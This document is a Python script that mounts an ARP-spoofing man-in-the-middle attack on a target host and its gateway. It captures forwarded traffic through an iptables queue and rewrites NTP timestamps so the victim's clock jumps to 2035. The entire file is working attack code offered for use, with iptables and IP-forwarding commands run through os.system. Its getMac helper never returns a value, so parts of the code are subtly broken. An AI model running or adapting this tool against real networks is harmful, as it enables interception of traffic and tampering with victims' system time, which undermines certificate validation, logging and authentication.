#!/usr/bin/python

import sys
import time
import datetime as dt
import threading
from scapy.all import *
from netfilterqueue import NetfilterQueue

def getMac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        r[Ether].src

try:
    ip = sys.argv[1]
    gateway = sys.argv[2]
except:
    print "using default gateway"
    gateway = sys.argv[1][:sys.argv[1].rfind('.')] + '.1'

#getting data from target machine and gateway
gateway_mac = getMac(gateway)
target_mac = getMac(ip)

#variable to control packet forwarding
sendIntercepted = False

#thread that forward packets after modifying it
def redirect():
    while sendIntercepted:
        send(ARP(op = 2, pdst = gateway, psrc = ip,
            hwdst = target_mac))
        send(ARP(op = 2, pdst = ip, psrc = gateway,
            hwdst = gateway_mac))
        time.sleep(1)

#change date year to 2035 using timestamps minus a difference between datetime and ntp timestamps
def modify_date(ntpdate):
    date = dt.datetime.fromtimestamp(ntpdate - 2208988800)
    futuredate = dt.datetime(2035, date.month, date.day,
            date.hour, date.minute, date.second)
    return time.mktime(futuredate.timetuple()) + 2208988800

def modify_packets(p):
    packet = IP(p.get_payload())

    if packet[IP].src != ip and packet.haslayer(UDP):
        if packet[UDP].sport == 123 or packet[UDP].dport == 123:
            packet[UDP].decode_payload_as(NTP) #verifying if packet is NTP (has UDP layer and is from port 123)

            packet[NTP].ref = modify_date(packet[NTP].ref) #modify all the reference dates that the target computer
            packet[NTP].recv = modify_date(packet[NTP].recv) # uses to update computer date
            packet[NTP].sent = modify_date(packet[NTP].sent)

            #build a new packet with all the layers but with modified payload
            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst)/UDP(sport=packet[UDP].sport,dport=packet[UDP].dport)/packet[NTP]

            p.set_payload(str(new_packet))
    #accept the packet after verifying and modifying it if needed
    p.accept()

sendIntercepted = True

#enables packet forwarding and configure a queue to have all packet through to process the packets
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system('iptables -A FORWARD -j NFQUEUE --queue-num 1')

#create the queue and bind a function to be applied in every packet
nfqueue = NetfilterQueue()
nfqueue.bind(1, modify_packets)

#start the forwarding threa
main_thread = threading.Thread(target = redirect)
main_thread.start()

try: #start queue
    nfqueue.run()

except KeyboardInterrupt:
    nfqueue.unbind()
    os.system('iptables -F') #reset iptables to previous configuration

sendIntercepted = False

# remove the arp spoffing and tell gateway and target to look for mac addresses again
send(ARP(op = 2, pdst = gateway, psrc = ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= target_mac), count = 4)
send(ARP(op = 2, pdst = ip, psrc = gateway, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 4)
